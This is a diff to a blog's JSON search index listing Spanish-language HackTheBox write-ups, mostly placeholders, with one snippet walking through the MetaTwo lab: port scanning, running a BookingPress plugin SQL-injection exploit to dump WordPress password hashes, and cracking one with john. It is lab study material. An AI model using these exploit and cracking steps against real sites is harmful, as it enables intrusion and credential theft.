@@ -1,6 +1,51 @@
 [
   
   {
+    "title": "Flight WriteUp",
+    "url": "/posts/fligth-writeup/",
+    "categories": "hackthebox, machine, writeup",
+    "tags": "",
+    "date": "2023-03-23 17:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "Proximamente…"
+  },
+  
+  {
+    "title": "Investigation WriteUp",
+    "url": "/posts/investigation-writeup/",
+    "categories": "hackthebox, machine, writeup",
+    "tags": "",
+    "date": "2023-03-22 17:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "Proximamente…"
+  },
+  
+  {
+    "title": "BroScience WriteUp",
+    "url": "/posts/broscience-writeup/",
+    "categories": "hackthebox, machine, writeup",
+    "tags": "",
+    "date": "2023-03-21 17:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "Proximamente…"
+  },
+  
+  {
     "title": "MetaTwo WriteUp",
     "url": "/posts/metatwo-writeup/",
     "categories": "hackthebox, machine, writeup",
@@ -13,6 +58,21 @@
 
 
     "snippet": "Hoy toca compremeter la máquina MetaTwo de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de  Word Press, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de Word Press,EnumeraciónIdentificando el OSEnviando trazas ICMP  (Internet Control Message Protocol) y usando el TTL(Time to Live) podemos identificar el OS.❯ ping -c1 10.10.11.186PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=156 ms--- 10.10.11.186 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 156.106/156.106/156.106/0.000 msNMAPSi realizamos un escaneo de puertos, encontramos:❯ nmap 10.10.11.186Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:53 -04Nmap scan report for 10.10.11.186Host is up (0.21s latency).Not shown: 997 closed tcp ports (reset)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 16.43 secondsAnalizando la WebSi intentamos acceder a la web, nos redirige, para solucionar esto hacemos:echo '10.10.11.186   metapress.htb' | tee -a /etc/hostsCone esto arreglamos el problema de virtual hosting.Websi ingresamos a la direcciñon que nos muestra vemos esto:EventsSi miramos el código fuente vemos que usa el plugin booking-press v1.0.10 si buscamos un exploit para esa versión, encontramos este y este otro.Creamos un evnto y en todos los campos de texto colocamos bookingpress_form.BookingPressAhora vemos el código fuente y buscamos por once y copiamos ese pin. Con el exploit que les compartí podemos dumpear la base de datos.❯ python3 exploit.py -u http://metapress.htb -n 30594111b0- BookingPress PoC-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1-- Count of users:  2|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.||manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|Ahora copiamos el hash y lo intentamos crakear con john.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])Cost 1 (iteration count) is 8192 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuspartylikearockstar (manager)1g 0:00:00:03 DONE (2023-03-24 14:36) 0.2617g/s 28950p/s 28950c/s 28950C/s poochini..music69Use the \"--show --format=phpass\" options to display all of the cracked passwords reliablySession completedPodemos autenticarnos con Word Press.Comprometiendo la máquinaAccedemos al panel de WordPress.WP LoginMás tarde continuo………"
+  },
+  
+  {
+    "title": "Encoding WriteUp",
+    "url": "/posts/encoding-writeup/",
+    "categories": "hackthebox, machine, writeup",
+    "tags": "",
+    "date": "2023-03-19 17:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "Proximamente…"
   },
   
   {
